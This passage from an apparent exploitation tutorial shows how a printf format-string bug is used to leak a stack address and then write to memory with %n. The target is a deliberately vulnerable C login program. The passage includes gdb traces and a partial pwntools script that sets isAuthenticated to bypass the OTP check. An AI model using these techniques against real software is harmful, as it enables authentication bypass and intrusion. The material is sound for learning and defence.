</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Payload bytes: b<span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAAAAAA\x00D/\xa6\x11\x85\xbe\xd3BBBBBBBB\xc9Q\x9c\xfb\xf3`\x00\x00&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending password payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Sent 0x2d bytes:
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000000</span>  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  │AAAA│AAAA│AAAA│AAAA│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000010</span>  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>44</span> 2f a6  <span style=color:#ae81ff>11</span> <span style=color:#ae81ff>85</span> be d3  <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span>  │AAAA│·D/·│····│BBBB│
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>00000020</span>  <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>42</span>  c9 <span style=color:#ae81ff>51</span> 9c fb  f3 <span style=color:#ae81ff>60</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  0a           │BBBB│·Q··│·<span style=color:#e6db74>`</span>··│·│
</span></span><span style=display:flex><span>    0000002d
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Receiving all data: Done <span style=color:#f92672>(</span>37B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received 0x25 bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;Authentication Failed\n&#39;</span>
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;Access Granted\n&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Process <span style=color:#e6db74>&#39;./vuln_canary&#39;</span> stopped with exit code -11 <span style=color:#f92672>(</span>SIGSEGV<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>pid 3978<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Program output:
</span></span><span style=display:flex><span>Authentication Failed
</span></span><span style=display:flex><span>Access Granted
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> SUCCESS: Exploit worked
</span></span></code></pre></div><h3 id=exploit-3-overwriting-the-isauthenticate-variable-using-n>Exploit 3: Overwriting the isAuthenticate variable using %n<a hidden class=anchor aria-hidden=true href=#exploit-3-overwriting-the-isauthenticate-variable-using-n>#</a></h3><h4 id=what-n-actually-does>What %n actually does?<a hidden class=anchor aria-hidden=true href=#what-n-actually-does>#</a></h4><p>In printf-family functions:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;hello%n&#34;</span>, <span style=color:#f92672>&amp;</span>x);
</span></span></code></pre></div><p>What happens internally</p><ul><li>printf keeps a counter: “how many characters have I printed so far?”</li><li>When it sees %n:<ul><li>It does not print anything</li><li>It writes that count into the pointer argument</li></ul></li></ul><p>So if &ldquo;hello&rdquo; is printed (5 chars): then x will be 5.</p><p><strong>Variants</strong></p><table><thead><tr><th>Specifier</th><th>Writes</th></tr></thead><tbody><tr><td><code>%n</code></td><td>4 bytes (<code>int *</code>)</td></tr><tr><td><code>%hn</code></td><td>2 bytes (<code>short *</code>)</td></tr><tr><td><code>%hhn</code></td><td>1 byte (<code>char *</code>)</td></tr><tr><td><code>%ln</code></td><td>8 bytes (<code>long *</code>)</td></tr></tbody></table><p><strong>Why %n is dangerous?</strong></p><p>Our vulnerable line:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>printf</span>(username);
</span></span></code></pre></div><p>You control:</p><ul><li>the format string</li><li>which arguments printf thinks exist</li></ul><p>That means:</p><ul><li>You can read arbitrary stack values (%p, %x)</li><li>You can write to arbitrary addresses (%n)</li></ul><p>This is stronger than buffer overflow.</p><h4 id=overwriting-isauthenticated-variable-on-stack>Overwriting isAuthenticated variable on Stack<a hidden class=anchor aria-hidden=true href=#overwriting-isauthenticated-variable-on-stack>#</a></h4><p>From our earlier stack, <code>rbp-0x14</code> → isAuthenticated (int)</p><p>So if we can:
1. Find the address of isAuthenticated
2. Pass it as a fake argument to printf
3. Use <code>%n</code></p><h4 id=how-n-arguments-work>How %n arguments work?<a hidden class=anchor aria-hidden=true href=#how-n-arguments-work>#</a></h4><p>Even though no arguments were passed, printf will:
• walk registers
• then stack
• and use whatever value happens to be there</p><p>This is why <code>%11$p</code> worked for leaks.</p><p>Let&rsquo;s consider this program</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>grantAccess</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Access Granted</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>checkOtp</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> otp, <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>isAuthenticated) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(otp, <span style=color:#e6db74>&#34;X7pA9kQ2&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#f92672>*</span>isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>AuthenticateUser</span>() {
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> username[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> otp[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter Username: &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, username);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter otp for: &#34;</span>);
</span></span><span style=display:flex><span>   	<span style=color:#a6e22e>printf</span>(username);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, otp);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;You entered otp: &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(otp);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>checkOtp</span>(otp, <span style=color:#f92672>&amp;</span>isAuthenticated);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (isAuthenticated <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>grantAccess</span>();
</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Authentication Failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>AuthenticateUser</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>It has two vulnerable <code>printf</code>&rsquo;s. Our idea is to leak address of <code>isAuthenticated</code> with first one and overwrite <code>isAuthenticated</code> using <code>%n</code> in second one.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -O0 -o vuln  main2.c
</span></span><span style=display:flex><span>main2.c: In <span style=color:#66d9ef>function</span> ‘AuthenticateUser’:
</span></span><span style=display:flex><span>main2.c:28:16: warning: format not a string literal and no format arguments <span style=color:#f92672>[</span>-Wformat-security<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>28</span> |         printf<span style=color:#f92672>(</span>username<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>      |                ^~~~~~~~
</span></span><span style=display:flex><span>main2.c:31:12: warning: format not a string literal and no format arguments <span style=color:#f92672>[</span>-Wformat-security<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>31</span> |     printf<span style=color:#f92672>(</span>otp<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>      |            ^~~
</span></span></code></pre></div><p>The stack frame of <code>AuthenticateUser</code> looks like this</p><pre tabindex=0><code>Higher addresses
┌──────────────────────────────────────────┐
│ rbp+8   │ Return address                 │
├──────────────────────────────────────────┤
│ rbp+0   │ Saved RBP                      │
├──────────────────────────────────────────┤
│ rbp-0x8 │ Stack Canary (8 bytes)         │
│         │  ends with 0x00  ← intentional │
├──────────────────────────────────────────┤
│ rbp-0x10│ otp[8]                         │
├──────────────────────────────────────────┤
│ rbp-0x18│ username[8]                    │
├──────────────────────────────────────────┤
│ rbp-0x1c│ isAuthenticated (int, 4 bytes) │
├──────────────────────────────────────────┤
│ rbp-0x20│ Padding (4 bytes, alignment)   │
└──────────────────────────────────────────┘
Lower addresses
</code></pre><p>So the address of <code>isAuthenticated</code> can be obtained by address of <code>username - 0x4</code>. We can leak the address of <code>username</code> first by printing the first argument to <code>printf</code> that is present in <code>rdi</code>.</p><p>Unfortunately this idea of leaking <code>username</code> doesn&rsquo;t work.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>Breakpoint 2, 0x000055555555528f in AuthenticateUser <span style=color:#f92672>()</span> at main2.c:28
</span></span><span style=display:flex><span>28	   	printf<span style=color:#f92672>(</span>username<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> info registers rdi rsi rdx rcx r8 r9
</span></span><span style=display:flex><span>rdi            0x7fffffffde98      <span style=color:#ae81ff>140737488346776</span>
</span></span><span style=display:flex><span>rsi            0x746f207265746e45  <span style=color:#ae81ff>8389960306515013189</span>
</span></span><span style=display:flex><span>rdx            0x0                 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>rcx            0x0                 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>r8             0xa                 <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span>r9             0xffffffff          <span style=color:#ae81ff>4294967295</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p &amp;username
</span></span><span style=display:flex><span>$1 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>char <span style=color:#f92672>(</span>*<span style=color:#f92672>)[</span>8<span style=color:#f92672>])</span> 0x7fffffffde98
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$2 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>char <span style=color:#f92672>(</span>*<span style=color:#f92672>)[</span>8<span style=color:#f92672>])</span> 0x7fffffffde98
</span></span></code></pre></div><p>Because although <code>&amp;username</code> is present in <code>rdi</code>, <code>printf</code>&rsquo;s va_list starts from <code>rsi</code>. Still <code>rsi</code> should&rsquo;ve contained <code>&amp;username</code> because previously <code>scanf</code> had written to it</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> AuthenticateUser:
</span></span><span style=display:flex><span>   0x000055555555521e &lt;+0&gt;:	endbr64
</span></span><span style=display:flex><span>   0x0000555555555222 &lt;+4&gt;:	push   rbp
</span></span><span style=display:flex><span>   0x0000555555555223 &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style=display:flex><span>   0x0000555555555226 &lt;+8&gt;:	sub    rsp,0x20
</span></span><span style=display:flex><span><span style=color:#f92672>=</span>&gt; 0x000055555555522a &lt;+12&gt;:	mov    rax,QWORD PTR fs:0x28
</span></span><span style=display:flex><span>   0x0000555555555233 &lt;+21&gt;:	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>,rax
</span></span><span style=display:flex><span>   0x0000555555555237 &lt;+25&gt;:	xor    eax,eax
</span></span><span style=display:flex><span>   0x0000555555555239 &lt;+27&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>rbp-0x1c<span style=color:#f92672>]</span>,0x0
</span></span><span style=display:flex><span>   0x0000555555555240 &lt;+34&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xdd5<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x55555555601c</span>
</span></span><span style=display:flex><span>   0x0000555555555247 &lt;+41&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x000055555555524a &lt;+44&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x000055555555524f &lt;+49&gt;:	call   0x5555555550b0 &lt;printf@plt&gt;
</span></span><span style=display:flex><span>   0x0000555555555254 &lt;+54&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0x18<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000555555555258 &lt;+58&gt;:	mov    rsi,rax
</span></span><span style=display:flex><span>   0x000055555555525b &lt;+61&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xdcb<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x55555555602d</span>
</span></span><span style=display:flex><span>   0x0000555555555262 &lt;+68&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x0000555555555265 &lt;+71&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x000055555555526a &lt;+76&gt;:	call   0x5555555550d0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>   0x000055555555526f &lt;+81&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xdba<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x555555556030</span>
</span></span><span style=display:flex><span>   0x0000555555555276 &lt;+88&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x0000555555555279 &lt;+91&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x000055555555527e &lt;+96&gt;:	call   0x5555555550b0 &lt;printf@plt&gt;
</span></span><span style=display:flex><span>   0x0000555555555283 &lt;+101&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0x18<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000555555555287 &lt;+105&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x000055555555528a &lt;+108&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x000055555555528f &lt;+113&gt;:	call   0x5555555550b0 &lt;printf@plt&gt;
</span></span><span style=display:flex><span>   0x0000555555555294 &lt;+118&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000555555555298 &lt;+122&gt;:	mov    rsi,rax
</span></span><span style=display:flex><span>   0x000055555555529b &lt;+125&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xd8b<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x55555555602d</span>
</span></span></code></pre></div><p>But somewhere in between it was modified by libc, since its not callee restored, we lost that value, but anyway this approach was not reliable.</p><h4 id=alternate-way-of-leaking-a-stack-address>Alternate way of leaking a stack address<a hidden class=anchor aria-hidden=true href=#alternate-way-of-leaking-a-stack-address>#</a></h4><p>Our goal is not to leak the exact address of <code>isAuthenticated</code>, we need to leak any stack address. Since the stack layout is predictable, we can derive all other addresses using the found address. Since our previous attempt of leaking <code>username</code> failed, the only other stack address lying on stack itself is <strong>saved rbp</strong> of main.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disass main
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> main:
</span></span><span style=display:flex><span>   0x0000555555555321 &lt;+0&gt;:	endbr64
</span></span><span style=display:flex><span>   0x0000555555555325 &lt;+4&gt;:	push   rbp
</span></span><span style=display:flex><span>   0x0000555555555326 &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style=display:flex><span>   0x0000555555555329 &lt;+8&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x000055555555532e &lt;+13&gt;:	call   0x55555555521e &lt;AuthenticateUser&gt;
</span></span><span style=display:flex><span>   0x0000555555555333 &lt;+18&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x0000555555555338 &lt;+23&gt;:	pop    rbp
</span></span><span style=display:flex><span>   0x0000555555555339 &lt;+24&gt;:	ret
</span></span><span style=display:flex><span>End of assembler dump.
</span></span></code></pre></div><p>There is no space allocate for main&rsquo;s stack frame. This is it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>Higher addresses
</span></span><span style=display:flex><span>┌──────────────────────────┐
</span></span><span style=display:flex><span>│ <span style=color:#66d9ef>return</span> address to _start │  ← <span style=color:#f92672>[</span>rbp+8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>├──────────────────────────┤
</span></span><span style=display:flex><span>│ saved rbp <span style=color:#f92672>(</span>from _start<span style=color:#f92672>)</span>  │  ← <span style=color:#f92672>[</span>rbp<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└──────────────────────────┘
</span></span><span style=display:flex><span>Lower addresses
</span></span></code></pre></div><p>So <code>isAuthenticated</code> is at <code>main's rbp - 0x2C</code> (44 bytes).</p><p>Since saved RBP is 32 bytes below <code>rsp</code>, we need to leak the 4th argument on stack, i.e., 6 (registers) + 4 = 10th argument.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./vuln
</span></span><span style=display:flex><span>Enter Username: %10$p
</span></span><span style=display:flex><span>Enter otp <span style=color:#66d9ef>for</span>: 0x7fff0093a0e0
</span></span></code></pre></div><p>So address of <code>isAuthenticated</code> is <code>0x7fff0093a0e0 - 0x2C = 0x7fff0093a0b4</code></p><h4 id=overwriting-the-isauthenticated>Overwriting the <code>isAuthenticated</code><a hidden class=anchor aria-hidden=true href=#overwriting-the-isauthenticated>#</a></h4><p>If we attempt to build the payload like <code>[ address of isAuthenticated (8 bytes) ][ %8$n ]</code></p><p>We will end up overwriting the stack canary since the buffer is more than 8 bytes and the <code>otp</code> variable is right next to the canary. But the even bigger problem is userspace addresses look like this in linux <code>0x00007fffffffdec0</code></p><pre tabindex=0><code>0x00007fffffffdec0
  ^^^^
  These are ALWAYS null bytes!
</code></pre><p>This is because:</p><ul><li>x64 uses 64-bit addresses (8 bytes)</li><li>But only 48 bits are actually used for virtual addresses</li><li>The upper 16 bits are always zero (canonical addressing)</li></ul><p>When we write it into memory in little endian it will look like this</p><pre tabindex=0><code>0x7fffffffdea0:	0x94	0xde	0xff	0xff	0xff	0x7f	0x00	0x00
</code></pre><p>The issue here is <code>printf</code> stops processing at null bytes and never reaches the format arguments.</p><p>To overcome this, we need to build payload in this format</p><pre tabindex=0><code>[padding/format_string] [address_at_the_end]
</code></pre><p>Now the actual otp string moved by 8 bytes, we change 8 to 9. Payload will look like <code>'%9$nXXXX' + '0x7fffffffde94'</code></p><p>And since the value of <code>isAuthenticated</code> need to be exactly <code>1</code>, we will change the argument to <code>h%9$nXXX</code>, now it will print one character <code>h</code> and sees <code>%9$n</code>, then it moves the <code>arg_ptr</code> to where <code>otp</code> string is present, but its value is the address of <code>isAuthenticated</code>. So it will dereference that address and ends up wriiting 1 there.</p><p>pwntools script for same</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;./vuln&#34;</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;debug&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Launching process&#34;</span>)
</span></span><span style=display:flex><span>    p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#34;./vuln&#34;</span>, stdin<span style=color:#f92672>=</span>PTY, stdout<span style=color:#f92672>=</span>PTY)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stage 1: Leak main RBP</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Waiting for Username prompt&#34;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Enter Username: &#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Sending format string leak&#34;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;%10$p&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Reading leak output&#34;</span>)
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Enter otp for: &#34;</span>, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    data <span style=color:#f92672>+=</span> p<span style=color:#f92672>.</span>recv(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>0.2</span>)   <span style=color:#75715e># &lt;-- CRITICAL: drain inline leak</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Full leak buffer:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>{</span>data<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    leaks <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>rb</span><span style=color:#e6db74>&#34;0x[0-9a-fA-F]+&#34;</span>, data)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> leaks:
</span></span><span style=display:flex><span>        log<span style=color:#f92672>.</span>failure(<span style=color:#e6db74>&#34;Failed to extract leaked RBP&#34;</span>)
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    main_rbp <span style=color:#f92672>=</span> int(leaks[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Leaked main RBP: </span><span style=color:#e6db74>{</span>hex(main_rbp)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stage 2: Calculate target</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    is_auth <span style=color:#f92672>=</span> main_rbp <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x2c</span>
</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;isAuthenticated @ </span><span style=color:#e6db74>{</span>hex(is_auth)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stage 3: %n payload</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    payload  <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;h&#34;</span>          <span style=color:#75715e># prints 1 byte</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;%9$n&#34;</span>       <span style=color:#75715e># writes 1 to *(arg9)</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;XXX&#34;</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> p64(is_auth)
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Payload bytes: </span><span style=color:#e6db74>{</span>payload<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stage 4: Trigger write</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------------------</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Sending OTP payload&#34;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>send(payload)
</span></span><span style=display:flex><span>
